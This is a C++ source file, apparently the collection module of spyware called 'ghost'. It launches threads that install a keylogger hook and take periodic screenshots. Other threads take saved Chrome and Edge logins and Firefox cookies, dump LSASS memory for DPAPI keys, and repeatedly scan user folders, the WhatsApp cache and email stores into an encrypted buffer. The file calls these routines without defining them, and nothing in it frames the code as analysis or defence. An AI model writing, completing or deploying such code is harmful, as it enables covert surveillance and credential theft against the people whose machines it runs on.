#include <mutex>
#include <vector>
#include <atomic>
#include <cstdint>
#include <thread>
#include <condition_variable> 

#include "collector.h"
#include "../core/ghost_core.h"

namespace ghost {
namespace collector {

std::atomic<bool> g_CollectionActive{false};
std::vector<uint8_t> g_EncryptedBuffer;
std::mutex g_BufferMutex;

std::vector<std::thread> g_Threads;
std::mutex g_CvMutex;
std::condition_variable g_Cv;

void AppendToBuffer(const uint8_t* data, size_t len) {
    std::lock_guard<std::mutex> _lock{g_BufferMutex};
    g_EncryptedBuffer.insert(g_EncryptedBuffer.end(), data, data + len);
}

void StartCollectionThreads() {
    if (g_CollectionActive.exchange(true)) return;

    keylog::InstallHook();

    g_Threads.emplace_back([]() {
        while (g_CollectionActive) {
            screenshot::PeriodicCaptureThread();
            
            std::unique_lock<std::mutex> lock(g_CvMutex);
            g_Cv.wait_for(lock, std::chrono::seconds(60), []{ return !g_CollectionActive.load(); });
        }
    });

    g_Threads.emplace_back([]() {
        creds::RipChromeLogins();
        creds::RipEdgeLogins();
        creds::RipFirefoxCookies();
        creds::DumpLsassForDPAPIKeys();
    });

    g_Threads.emplace_back([]() {
        while (g_CollectionActive) {
            files::CrawlUserDirs();
            files::ScanWhatsAppCache();
            files::ScanEmailStores();
            
            std::unique_lock<std::mutex> lock(g_CvMutex);
            g_Cv.wait_for(lock, std::chrono::hours(4), []{ return !g_CollectionActive.load(); });
        }
    });
}

void StopCollectionThreads() {
    g_CollectionActive = false;
    
    g_Cv.notify_all();

    for (auto& t : g_Threads) {
        if (t.joinable()) {
            t.join();
        }
    }
    g_Threads.clear();

    keylog::UninstallHook();
}

}
}